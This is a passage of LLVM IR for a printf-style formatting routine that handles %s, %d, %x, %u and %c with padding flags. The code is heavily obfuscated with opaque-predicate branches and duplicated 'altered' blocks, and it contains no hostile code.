originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i8*, align 8
  %11 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %10, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %11, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %10, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %11, i32 0, i32 0
  %16 = call i32 @print(i8** null, i8* %14, %struct.__va_list_tag* %15)
  %17 = load i32, i32* @x.5
  %18 = load i32, i32* @y.6
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %16

originalBBalteredBB:                              ; preds = %originalBB, %1
  %25 = alloca i8*, align 8
  %26 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %25, align 8
  %27 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %26, i32 0, i32 0
  %28 = bitcast %struct.__va_list_tag* %27 to i8*
  call void @llvm.va_start(i8* %28)
  %29 = load i8*, i8** %25, align 8
  %30 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %26, i32 0, i32 0
  %31 = call i32 @print(i8** null, i8* %29, %struct.__va_list_tag* %30)
  br label %originalBB
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #2

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %4 = load i32, i32* @x.7
  %5 = load i32, i32* @y.8
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = alloca i8**, align 8
  %13 = alloca i8*, align 8
  %14 = alloca %struct.__va_list_tag*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca [2 x i8], align 1
  %19 = alloca i8*, align 8
  store i8** %0, i8*** %12, align 8
  store i8* %1, i8** %13, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %14, align 8
  store i32 0, i32* %17, align 4
  %20 = load i32, i32* @x.7
  %21 = load i32, i32* @y.8
  %22 = sub i32 %20, 1
  %23 = mul i32 %20, %22
  %24 = urem i32 %23, 2
  %25 = icmp eq i32 %24, 0
  %26 = icmp slt i32 %21, 10
  %27 = or i1 %25, %26
  br i1 %27, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %28

; <label>:28:                                     ; preds = %555, %originalBBpart2
  %29 = load i8*, i8** %13, align 8
  %30 = load i8, i8* %29, align 1
  %31 = zext i8 %30 to i32
  %32 = icmp ne i32 %31, 0
  br i1 %32, label %33, label %558

; <label>:33:                                     ; preds = %28
  %34 = load i8*, i8** %13, align 8
  %35 = load i8, i8* %34, align 1
  %36 = zext i8 %35 to i32
  %37 = icmp eq i32 %36, 37
  br i1 %37, label %38, label %546

; <label>:38:                                     ; preds = %33
  %39 = load i32, i32* @x.7
  %40 = load i32, i32* @y.8
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %38
  %47 = load i8*, i8** %13, align 8
  %48 = getelementptr inbounds i8, i8* %47, i32 1
  store i8* %48, i8** %13, align 8
  store i32 0, i32* %16, align 4
  store i32 0, i32* %15, align 4
  %49 = load i8*, i8** %13, align 8
  %50 = load i8, i8* %49, align 1
  %51 = zext i8 %50 to i32
  %52 = icmp eq i32 %51, 0
  %53 = load i32, i32* @x.7
  %54 = load i32, i32* @y.8
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %52, label %61, label %78

; <label>:61:                                     ; preds = %originalBBpart24
  %62 = load i32, i32* @x.7
  %63 = load i32, i32* @y.8
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %61
  %70 = load i32, i32* @x.7
  %71 = load i32, i32* @y.8
  %72 = sub i32 %70, 1
  %73 = mul i32 %70, %72
  %74 = urem i32 %73, 2
  %75 = icmp eq i32 %74, 0
  %76 = icmp slt i32 %71, 10
  %77 = or i1 %75, %76
  br i1 %77, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %558

; <label>:78:                                     ; preds = %originalBBpart24
  %79 = load i8*, i8** %13, align 8
  %80 = load i8, i8* %79, align 1
  %81 = zext i8 %80 to i32
  %82 = icmp eq i32 %81, 37
  br i1 %82, label %83, label %100

; <label>:83:                                     ; preds = %78
  %84 = load i32, i32* @x.7
  %85 = load i32, i32* @y.8
  %86 = sub i32 %84, 1
  %87 = mul i32 %84, %86
  %88 = urem i32 %87, 2
  %89 = icmp eq i32 %88, 0
  %90 = icmp slt i32 %85, 10
  %91 = or i1 %89, %90
  br i1 %91, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %83
  %92 = load i32, i32* @x.7
  %93 = load i32, i32* @y.8
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %547

; <label>:100:                                    ; preds = %78
  %101 = load i32, i32* @x.7
  %102 = load i32, i32* @y.8
  %103 = sub i32 %101, 1
  %104 = mul i32 %101, %103
  %105 = urem i32 %104, 2
  %106 = icmp eq i32 %105, 0
  %107 = icmp slt i32 %102, 10
  %108 = or i1 %106, %107
  br i1 %108, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %100
  %109 = load i8*, i8** %13, align 8
  %110 = load i8, i8* %109, align 1
  %111 = zext i8 %110 to i32
  %112 = icmp eq i32 %111, 45
  %113 = load i32, i32* @x.7
  %114 = load i32, i32* @y.8
  %115 = sub i32 %113, 1
  %116 = mul i32 %113, %115
  %117 = urem i32 %116, 2
  %118 = icmp eq i32 %117, 0
  %119 = icmp slt i32 %114, 10
  %120 = or i1 %118, %119
  br i1 %120, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %112, label %121, label %124

; <label>:121:                                    ; preds = %originalBBpart216
  %122 = load i8*, i8** %13, align 8
  %123 = getelementptr inbounds i8, i8* %122, i32 1
  store i8* %123, i8** %13, align 8
  store i32 1, i32* %16, align 4
  br label %124

; <label>:124:                                    ; preds = %121, %originalBBpart216
  br label %125

; <label>:125:                                    ; preds = %130, %124
  %126 = load i8*, i8** %13, align 8
  %127 = load i8, i8* %126, align 1
  %128 = zext i8 %127 to i32
  %129 = icmp eq i32 %128, 48
  br i1 %129, label %130, label %135

; <label>:130:                                    ; preds = %125
  %131 = load i8*, i8** %13, align 8
  %132 = getelementptr inbounds i8, i8* %131, i32 1
  store i8* %132, i8** %13, align 8
  %133 = load i32, i32* %16, align 4
  %134 = or i32 %133, 2
  store i32 %134, i32* %16, align 4
  br label %125

; <label>:135:                                    ; preds = %125
  %136 = load i32, i32* @x.7
  %137 = load i32, i32* @y.8
  %138 = sub i32 %136, 1
  %139 = mul i32 %136, %138
  %140 = urem i32 %139, 2
  %141 = icmp eq i32 %140, 0
  %142 = icmp slt i32 %137, 10
  %143 = or i1 %141, %142
  br i1 %143, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %135
  %144 = load i32, i32* @x.7
  %145 = load i32, i32* @y.8
  %146 = sub i32 %144, 1
  %147 = mul i32 %144, %146
  %148 = urem i32 %147, 2
  %149 = icmp eq i32 %148, 0
  %150 = icmp slt i32 %145, 10
  %151 = or i1 %149, %150
  br i1 %151, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %152

; <label>:152:                                    ; preds = %173, %originalBBpart220
  %153 = load i8*, i8** %13, align 8
  %154 = load i8, i8* %153, align 1
  %155 = zext i8 %154 to i32
  %156 = icmp sge i32 %155, 48
  br i1 %156, label %157, label %162

; <label>:157:                                    ; preds = %152
  %158 = load i8*, i8** %13, align 8
  %159 = load i8, i8* %158, align 1
  %160 = zext i8 %159 to i32
  %161 = icmp sle i32 %160, 57
  br label %162

; <label>:162:                                    ; preds = %157, %152
  %163 = phi i1 [ false, %152 ], [ %161, %157 ]
  br i1 %163, label %164, label %176

; <label>:164:                                    ; preds = %162
  %165 = load i32, i32* %15, align 4
  %166 = mul nsw i32 %165, 10
  store i32 %166, i32* %15, align 4
  %167 = load i8*, i8** %13, align 8
  %168 = load i8, i8* %167, align 1
  %169 = zext i8 %168 to i32
  %170 = sub nsw i32 %169, 48
  %171 = load i32, i32* %15, align 4
  %172 = add nsw i32 %171, %170
  store i32 %172, i32* %15, align 4
  br label %173

; <label>:173:                                    ; preds = %164
  %174 = load i8*, i8** %13, align 8
  %175 = getelementptr inbounds i8, i8* %174, i32 1
  store i8* %175, i8** %13, align 8
  br label %152

; <label>:176:                                    ; preds = %162
  %177 = load i8*, i8** %13, align 8
  %178 = load i8, i8* %177, align 1
  %179 = zext i8 %178 to i32
  %180 = icmp eq i32 %179, 115
  br i1 %180, label %181, label %263

; <label>:181:                                    ; preds = %176
  %182 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %183 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %182, i32 0, i32 0
  %184 = load i32, i32* %183, align 8
  %185 = icmp ule i32 %184, 40
  br i1 %185, label %186, label %208

; <label>:186:                                    ; preds = %181
  %187 = load i32, i32* @x.7
  %188 = load i32, i32* @y.8
  %189 = sub i32 %187, 1
  %190 = mul i32 %187, %189
  %191 = urem i32 %190, 2
  %192 = icmp eq i32 %191, 0
  %193 = icmp slt i32 %188, 10
  %194 = or i1 %192, %193
  br i1 %194, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %186
  %195 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %182, i32 0, i32 3
  %196 = load i8*, i8** %195, align 8
  %197 = getelementptr i8, i8* %196, i32 %184
  %198 = bitcast i8* %197 to i32*
  %199 = add i32 %184, 8
  store i32 %199, i32* %183, align 8
  %200 = load i32, i32* @x.7
  %201 = load i32, i32* @y.8
  %202 = sub i32 %200, 1
  %203 = mul i32 %200, %202
  %204 = urem i32 %203, 2
  %205 = icmp eq i32 %204, 0
  %206 = icmp slt i32 %201, 10
  %207 = or i1 %205, %206
  br i1 %207, label %originalBBpart229, label %originalBB22alteredBB

originalBBpart229:                                ; preds = %originalBB22
  br label %213

; <label>:208:                                    ; preds = %181
  %209 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %182, i32 0, i32 2
  %210 = load i8*, i8** %209, align 8
  %211 = bitcast i8* %210 to i32*
  %212 = getelementptr i8, i8* %210, i32 8
  store i8* %212, i8** %209, align 8
  br label %213

; <label>:213:                                    ; preds = %208, %originalBBpart229
  %214 = phi i32* [ %198, %originalBBpart229 ], [ %211, %208 ]
  %215 = load i32, i32* @x.7
  %216 = load i32, i32* @y.8
  %217 = sub i32 %215, 1
  %218 = mul i32 %215, %217
  %219 = urem i32 %218, 2
  %220 = icmp eq i32 %219, 0
  %221 = icmp slt i32 %216, 10
  %222 = or i1 %220, %221
  br i1 %222, label %originalBB31, label %originalBB31alteredBB

originalBB31:                                     ; preds = %originalBB31alteredBB, %213
  %223 = load i32, i32* %214, align 4
  %224 = sext i32 %223 to i64
  %225 = inttoptr i64 %224 to i8*
  store i8* %225, i8** %19, align 8
  %226 = load i8**, i8*** %12, align 8
  %227 = load i8*, i8** %19, align 8
  %228 = icmp ne i8* %227, null
  %229 = load i32, i32* @x.7
  %230 = load i32, i32* @y.8
  %231 = sub i32 %229, 1
  %232 = mul i32 %229, %231
  %233 = urem i32 %232, 2
  %234 = icmp eq i32 %233, 0
  %235 = icmp slt i32 %230, 10
  %236 = or i1 %234, %235
  br i1 %236, label %originalBBpart233, label %originalBB31alteredBB

originalBBpart233:                                ; preds = %originalBB31
  br i1 %228, label %237, label %239

; <label>:237:                                    ; preds = %originalBBpart233
  %238 = load i8*, i8** %19, align 8
  br label %240

; <label>:239:                                    ; preds = %originalBBpart233
  br label %240

; <label>:240:                                    ; preds = %239, %237
  %241 = phi i8* [ %238, %237 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.75, i32 0, i32 0), %239 ]
  %242 = load i32, i32* @x.7
  %243 = load i32, i32* @y.8
  %244 = sub i32 %242, 1
  %245 = mul i32 %242, %244
  %246 = urem i32 %245, 2
  %247 = icmp eq i32 %246, 0
  %248 = icmp slt i32 %243, 10
  %249 = or i1 %247, %248
  br i1 %249, label %originalBB35, label %originalBB35alteredBB

originalBB35:                                     ; preds = %originalBB35alteredBB, %240
  %250 = load i32, i32* %15, align 4
  %251 = load i32, i32* %16, align 4
  %252 = call i32 @prints(i8** %226, i8* %241, i32 %250, i32 %251)
  %253 = load i32, i32* %17, align 4
  %254 = add nsw i32 %253, %252
  store i32 %254, i32* %17, align 4
  %255 = load i32, i32* @x.7
  %256 = load i32, i32* @y.8
  %257 = sub i32 %255, 1
  %258 = mul i32 %255, %257
  %259 = urem i32 %258, 2
  %260 = icmp eq i32 %259, 0
  %261 = icmp slt i32 %256, 10
  %262 = or i1 %260, %261
  br i1 %262, label %originalBBpart251, label %originalBB35alteredBB

originalBBpart251:                                ; preds = %originalBB35
  br label %555

; <label>:263:                                    ; preds = %176
  %264 = load i8*, i8** %13, align 8
  %265 = load i8, i8* %264, align 1
  %266 = zext i8 %265 to i32
  %267 = icmp eq i32 %266, 100
  br i1 %267, label %268, label %309

; <label>:268:                                    ; preds = %263
  %269 = load i8**, i8*** %12, align 8
  %270 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %271 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %270, i32 0, i32 0
  %272 = load i32, i32* %271, align 8
  %273 = icmp ule i32 %272, 40
  br i1 %273, label %274, label %296

; <label>:274:                                    ; preds = %268
  %275 = load i32, i32* @x.7
  %276 = load i32, i32* @y.8
  %277 = sub i32 %275, 1
  %278 = mul i32 %275, %277
  %279 = urem i32 %278, 2
  %280 = icmp eq i32 %279, 0
  %281 = icmp slt i32 %276, 10
  %282 = or i1 %280, %281
  br i1 %282, label %originalBB53, label %originalBB53alteredBB

originalBB53:                                     ; preds = %originalBB53alteredBB, %274
  %283 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %270, i32 0, i32 3
  %284 = load i8*, i8** %283, align 8
  %285 = getelementptr i8, i8* %284, i32 %272
  %286 = bitcast i8* %285 to i32*
  %287 = add i32 %272, 8
  store i32 %287, i32* %271, align 8
  %288 = load i32, i32* @x.7
  %289 = load i32, i32* @y.8
  %290 = sub i32 %288, 1
  %291 = mul i32 %288, %290
  %292 = urem i32 %291, 2
  %293 = icmp eq i32 %292, 0
  %294 = icmp slt i32 %289, 10
  %295 = or i1 %293, %294
  br i1 %295, label %originalBBpart265, label %originalBB53alteredBB

originalBBpart265:                                ; preds = %originalBB53
  br label %301

; <label>:296:                                    ; preds = %268
  %297 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %270, i32 0, i32 2
  %298 = load i8*, i8** %297, align 8
  %299 = bitcast i8* %298 to i32*
  %300 = getelementptr i8, i8* %298, i32 8
  store i8* %300, i8** %297, align 8
  br label %301

; <label>:301:                                    ; preds = %296, %originalBBpart265
  %302 = phi i32* [ %286, %originalBBpart265 ], [ %299, %296 ]
  %303 = load i32, i32* %302, align 4
  %304 = load i32, i32* %15, align 4
  %305 = load i32, i32* %16, align 4
  %306 = call i32 @printi(i8** %269, i32 %303, i32 10, i32 1, i32 %304, i32 %305, i32 97)
  %307 = load i32, i32* %17, align 4
  %308 = add nsw i32 %307, %306
  store i32 %308, i32* %17, align 4
  br label %555

; <label>:309:                                    ; preds = %263
  %310 = load i8*, i8** %13, align 8
  %311 = load i8, i8* %310, align 1
  %312 = zext i8 %311 to i32
  %313 = icmp eq i32 %312, 120
  br i1 %313, label %314, label %387

; <label>:314:                                    ; preds = %309
  %315 = load i8**, i8*** %12, align 8
  %316 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %317 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %316, i32 0, i32 0
  %318 = load i32, i32* %317, align 8
  %319 = icmp ule i32 %318, 40
  br i1 %319, label %320, label %342

; <label>:320:                                    ; preds = %314
  %321 = load i32, i32* @x.7
  %322 = load i32, i32* @y.8
  %323 = sub i32 %321, 1
  %324 = mul i32 %321, %323
  %325 = urem i32 %324, 2
  %326 = icmp eq i32 %325, 0
  %327 = icmp slt i32 %322, 10
  %328 = or i1 %326, %327
  br i1 %328, label %originalBB67, label %originalBB67alteredBB

originalBB67:                                     ; preds = %originalBB67alteredBB, %320
  %329 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %316, i32 0, i32 3
  %330 = load i8*, i8** %329, align 8
  %331 = getelementptr i8, i8* %330, i32 %318
  %332 = bitcast i8* %331 to i32*
  %333 = add i32 %318, 8
  store i32 %333, i32* %317, align 8
  %334 = load i32, i32* @x.7
  %335 = load i32, i32* @y.8
  %336 = sub i32 %334, 1
  %337 = mul i32 %334, %336
  %338 = urem i32 %337, 2
  %339 = icmp eq i32 %338, 0
  %340 = icmp slt i32 %335, 10
  %341 = or i1 %339, %340
  br i1 %341, label %originalBBpart273, label %originalBB67alteredBB

originalBBpart273:                                ; preds = %originalBB67
  br label %363

; <label>:342:                                    ; preds = %314
  %343 = load i32, i32* @x.7
  %344 = load i32, i32* @y.8
  %345 = sub i32 %343, 1
  %346 = mul i32 %343, %345
  %347 = urem i32 %346, 2
  %348 = icmp eq i32 %347, 0
  %349 = icmp slt i32 %344, 10
  %350 = or i1 %348, %349
  br i1 %350, label %originalBB75, label %originalBB75alteredBB

originalBB75:                                     ; preds = %originalBB75alteredBB, %342
  %351 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %316, i32 0, i32 2
  %352 = load i8*, i8** %351, align 8
  %353 = bitcast i8* %352 to i32*
  %354 = getelementptr i8, i8* %352, i32 8
  store i8* %354, i8** %351, align 8
  %355 = load i32, i32* @x.7
  %356 = load i32, i32* @y.8
  %357 = sub i32 %355, 1
  %358 = mul i32 %355, %357
  %359 = urem i32 %358, 2
  %360 = icmp eq i32 %359, 0
  %361 = icmp slt i32 %356, 10
  %362 = or i1 %360, %361
  br i1 %362, label %originalBBpart277, label %originalBB75alteredBB

originalBBpart277:                                ; preds = %originalBB75
  br label %363

; <label>:363:                                    ; preds = %originalBBpart277, %originalBBpart273
  %364 = phi i32* [ %332, %originalBBpart273 ], [ %353, %originalBBpart277 ]
  %365 = load i32, i32* @x.7
  %366 = load i32, i32* @y.8
  %367 = sub i32 %365, 1
  %368 = mul i32 %365, %367
  %369 = urem i32 %368, 2
  %370 = icmp eq i32 %369, 0
  %371 = icmp slt i32 %366, 10
  %372 = or i1 %370, %371
  br i1 %372, label %originalBB79, label %originalBB79alteredBB

originalBB79:                                     ; preds = %originalBB79alteredBB, %363
  %373 = load i32, i32* %364, align 4
  %374 = load i32, i32* %15, align 4
  %375 = load i32, i32* %16, align 4
  %376 = call i32 @printi(i8** %315, i32 %373, i32 16, i32 0, i32 %374, i32 %375, i32 97)
  %377 = load i32, i32* %17, align 4
  %378 = add nsw i32 %377, %376
  store i32 %378, i32* %17, align 4
  %379 = load i32, i32* @x.7
  %380 = load i32, i32* @y.8
  %381 = sub i32 %379, 1
  %382 = mul i32 %379, %381
  %383 = urem i32 %382, 2
  %384 = icmp eq i32 %383, 0
  %385 = icmp slt i32 %380, 10
  %386 = or i1 %384, %385
  br i1 %386, label %originalBBpart283, label %originalBB79alteredBB

originalBBpart283:                                ; preds = %originalBB79
  br label %555

; <label>:387:                                    ; preds = %309
  %388 = load i32, i32* @x.7
  %389 = load i32, i32* @y.8
  %390 = sub i32 %388, 1
  %391 = mul i32 %388, %390
  %392 = urem i32 %391, 2
  %393 = icmp eq i32 %392, 0
  %394 = icmp slt i32 %389, 10
  %395 = or i1 %393, %394
  br i1 %395, label %originalBB85, label %originalBB85alteredBB

originalBB85:                                     ; preds = %originalBB85alteredBB, %387
  %396 = load i8*, i8** %13, align 8
  %397 = load i8, i8* %396, align 1
  %398 = zext i8 %397 to i32
  %399 = icmp eq i32 %398, 88
  %400 = load i32, i32* @x.7
  %401 = load i32, i32* @y.8
  %402 = sub i32 %400, 1
  %403 = mul i32 %400, %402
  %404 = urem i32 %403, 2
  %405 = icmp eq i32 %404, 0
  %406 = icmp slt i32 %401, 10
  %407 = or i1 %405, %406
  br i1 %407, label %originalBBpart287, label %originalBB85alteredBB

originalBBpart287:                                ; preds = %originalBB85
  br i1 %399, label %408, label %465

; <label>:408:                                    ; preds = %originalBBpart287
  %409 = load i32, i32* @x.7
  %410 = load i32, i32* @y.8
  %411 = sub i32 %409, 1
  %412 = mul i32 %409, %411
  %413 = urem i32 %412, 2
  %414 = icmp eq i32 %413, 0
  %415 = icmp slt i32 %410, 10
  %416 = or i1 %414, %415
  br i1 %416, label %originalBB89, label %originalBB89alteredBB

originalBB89:                                     ; preds = %originalBB89alteredBB, %408
  %417 = load i8**, i8*** %12, align 8
  %418 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %419 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %418, i32 0, i32 0
  %420 = load i32, i32* %419, align 8
  %421 = icmp ule i32 %420, 40
  %422 = load i32, i32* @x.7
  %423 = load i32, i32* @y.8
  %424 = sub i32 %422, 1
  %425 = mul i32 %422, %424
  %426 = urem i32 %425, 2
  %427 = icmp eq i32 %426, 0
  %428 = icmp slt i32 %423, 10
  %429 = or i1 %427, %428
  br i1 %429, label %originalBBpart291, label %originalBB89alteredBB

originalBBpart291:                                ; preds = %originalBB89
  br i1 %421, label %430, label %436

; <label>:430:                                    ; preds = %originalBBpart291
  %431 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %418, i32 0, i32 3
  %432 = load i8*, i8** %431, align 8
  %433 = getelementptr i8, i8* %432, i32 %420
  %434 = bitcast i8* %433 to i32*
  %435 = add i32 %420, 8
  store i32 %435, i32* %419, align 8
  br label %457

; <label>:436:                                    ; preds = %originalBBpart291
  %437 = load i32, i32* @x.7
  %438 = load i32, i32* @y.8
  %439 = sub i32 %437, 1
  %440 = mul i32 %437, %439
  %441 = urem i32 %440, 2
  %442 = icmp eq i32 %441, 0
  %443 = icmp slt i32 %438, 10
  %444 = or i1 %442, %443
  br i1 %444, label %originalBB93, label %originalBB93alteredBB

originalBB93:                                     ; preds = %originalBB93alteredBB, %436
  %445 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %418, i32 0, i32 2
  %446 = load i8*, i8** %445, align 8
  %447 = bitcast i8* %446 to i32*
  %448 = getelementptr i8, i8* %446, i32 8
  store i8* %448, i8** %445, align 8
  %449 = load i32, i32* @x.7
  %450 = load i32, i32* @y.8
  %451 = sub i32 %449, 1
  %452 = mul i32 %449, %451
  %453 = urem i32 %452, 2
  %454 = icmp eq i32 %453, 0
  %455 = icmp slt i32 %450, 10
  %456 = or i1 %454, %455
  br i1 %456, label %originalBBpart295, label %originalBB93alteredBB

originalBBpart295:                                ; preds = %originalBB93
  br label %457

; <label>:457:                                    ; preds = %originalBBpart295, %430
  %458 = phi i32* [ %434, %430 ], [ %447, %originalBBpart295 ]
  %459 = load i32, i32* %458, align 4
  %460 = load i32, i32* %15, align 4
  %461 = load i32, i32* %16, align 4
  %462 = call i32 @printi(i8** %417, i32 %459, i32 16, i32 0, i32 %460, i32 %461, i32 65)
  %463 = load i32, i32* %17, align 4
  %464 = add nsw i32 %463, %462
  store i32 %464, i32* %17, align 4
  br label %555

; <label>:465:                                    ; preds = %originalBBpart287
  %466 = load i8*, i8** %13, align 8
  %467 = load i8, i8* %466, align 1
  %468 = zext i8 %467 to i32
  %469 = icmp eq i32 %468, 117
  br i1 %469, label %470, label %495

; <label>:470:                                    ; preds = %465
  %471 = load i8**, i8*** %12, align 8
  %472 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %473 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %472, i32 0, i32 0
  %474 = load i32, i32* %473, align 8
  %475 = icmp ule i32 %474, 40
  br i1 %475, label %476, label %482

; <label>:476:                                    ; preds = %470
  %477 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %472, i32 0, i32 3
  %478 = load i8*, i8** %477, align 8
  %479 = getelementptr i8, i8* %478, i32 %474
  %480 = bitcast i8* %479 to i32*
  %481 = add i32 %474, 8
  store i32 %481, i32* %473, align 8
  br label %487

; <label>:482:                                    ; preds = %470
  %483 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %472, i32 0, i32 2
  %484 = load i8*, i8** %483, align 8
  %485 = bitcast i8* %484 to i32*
  %486 = getelementptr i8, i8* %484, i32 8
  store i8* %486, i8** %483, align 8
  br label %487

; <label>:487:                                    ; preds = %482, %476
  %488 = phi i32* [ %480, %476 ], [ %485, %482 ]
  %489 = load i32, i32* %488, align 4
  %490 = load i32, i32* %15, align 4
  %491 = load i32, i32* %16, align 4
  %492 = call i32 @printi(i8** %471, i32 %489, i32 10, i32 0, i32 %490, i32 %491, i32 97)
  %493 = load i32, i32* %17, align 4
  %494 = add nsw i32 %493, %492
  store i32 %494, i32* %17, align 4
  br label %555

; <label>:495:                                    ; preds = %465
  %496 = load i32, i32* @x.7
  %497 = load i32, i32* @y.8
  %498 = sub i32 %496, 1
  %499 = mul i32 %496, %498
  %500 = urem i32 %499, 2
  %501 = icmp eq i32 %500, 0
  %502 = icmp slt i32 %497, 10
  %503 = or i1 %501, %502
  br i1 %503, label %originalBB97, label %originalBB97alteredBB

originalBB97:                                     ; preds = %originalBB97alteredBB, %495
  %504 = load i8*, i8** %13, align 8
  %505 = load i8, i8* %504, align 1
  %506 = zext i8 %505 to i32
  %507 = icmp eq i32 %506, 99
  %508 = load i32, i32* @x.7
  %509 = load i32, i32* @y.8
  %510 = sub i32 %508, 1
  %511 = mul i32 %508, %510
  %512 = urem i32 %511, 2
  %513 = icmp eq i32 %512, 0
  %514 = icmp slt i32 %509, 10
  %515 = or i1 %513, %514
  br i1 %515, label %originalBBpart299, label %originalBB97alteredBB

originalBBpart299:                                ; preds = %originalBB97
  br i1 %507, label %516, label %545

; <label>:516:                                    ; preds = %originalBBpart299
  %517 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %518 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %517, i32 0, i32 0
  %519 = load i32, i32* %518, align 8
  %520 = icmp ule i32 %519, 40
  br i1 %520, label %521, label %527

; <label>:521:                                    ; preds = %516
  %522 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %517, i32 0, i32 3
  %523 = load i8*, i8** %522, align 8
  %524 = getelementptr i8, i8* %523, i32 %519
  %525 = bitcast i8* %524 to i32*
  %526 = add i32 %519, 8
  store i32 %526, i32* %518, align 8
  br label %532

; <label>:527:                                    ; preds = %516
  %528 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %517, i32 0, i32 2
  %529 = load i8*, i8** %528, align 8
  %530 = bitcast i8* %529 to i32*
  %531 = getelementptr i8, i8* %529, i32 8
  store i8* %531, i8** %528, align 8
  br label %532

; <label>:532:                                    ; preds = %527, %521
  %533 = phi i32* [ %525, %521 ], [ %530, %527 ]
  %534 = load i32, i32* %533, align 4
  %535 = trunc i32 %534 to i8
  %536 = getelementptr inbounds [2 x i8], [2 x i8]* %18, i64 0, i64 0
  store i8 %535, i8* %536, align 1
  %537 = getelementptr inbounds [2 x i8], [2 x i8]* %18, i64 0, i64 1
  store i8 0, i8* %537, align 1
  %538 = load i8**, i8*** %12, align 8
  %539 = getelementptr inbounds [2 x i8], [2 x i8]* %18, i32 0, i32 0
  %540 = load i32, i32* %15, align 4
  %541 = load i32, i32* %16, align 4
  %542 = call i32 @prints(i8** %538, i8* %539, i32 %540, i32 %541)
  %543 = load i32, i32* %17, align 4
  %544 = add nsw i32 %543, %542
  store i32 %544, i32* %17, align 4
  br label %555

; <label>:545:                                    ; preds = %originalBBpart299
  br label %554

; <label>:546:                                    ; preds = %33
  br label %547

